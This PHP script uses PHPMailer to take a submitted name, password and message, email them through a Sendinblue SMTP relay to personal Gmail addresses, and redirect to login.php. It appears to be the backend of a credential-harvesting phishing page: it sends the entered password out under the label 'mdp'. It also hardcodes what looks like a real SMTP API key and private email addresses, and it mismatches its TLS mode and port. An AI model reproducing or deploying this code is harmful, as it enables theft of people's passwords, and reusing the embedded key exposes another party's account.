<?php
    ini_set('include_path', './include');
    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\Exception;
    use PHPMailer\PHPMailer\SMTP;

    require 'include\PHPMailer-master\src/Exception.php';
    require 'include\PHPMailer-master\src/PHPMailer.php';
    require 'include\PHPMailer-master\src/SMTP.php';

    $recipient="royan2k22@gmail.com"; //Enter your mail address
    $subject="Contact from Website"; //Subject 
    // $sender=$_POST["name"];
    // $password=$_POST["password"];
    // $message=$_POST["message"];
    $sender='sefsefsef';
    $password='fsefsefsef';
    $message='sefsef';
    sleep(1);

    $mail = new PHPMailer(true);

try {
    //Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'smtp-relay.sendinblue.com';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'royan2k22@gmail.com';                     //SMTP username
    $mail->Password   = 'xsmtpsib-e73b6542ce00d0273d4bdf04b5025f44c2353ed1ab0236837ebea6145295592b-pD0XFhacbjRUdBP6';                               //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
    $mail->Port       = 587;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('royan2k22@gmail.com', 'Victor');
    $mail->addAddress('royan2k22@gmail.com', 'Joe User');     //Add a recipient
    $mail->addAddress('dewwaillyvictor@gmail.com');               //Name is optional
    // $mail->addReplyTo('info@example.com', 'Information');
    // $mail->addCC('cc@example.com');
    // $mail->addBCC('bcc@example.com');

    //Attachments
    // $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
    // $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name

    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'Contact from Website';
    $mail->Body    = 'This is the HTML message body <b>in bold!</b>'.$sender.'mdp'.$password.'message'.$message;
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
    header("Location:login.php"); //Set here redirect page or destination page
?>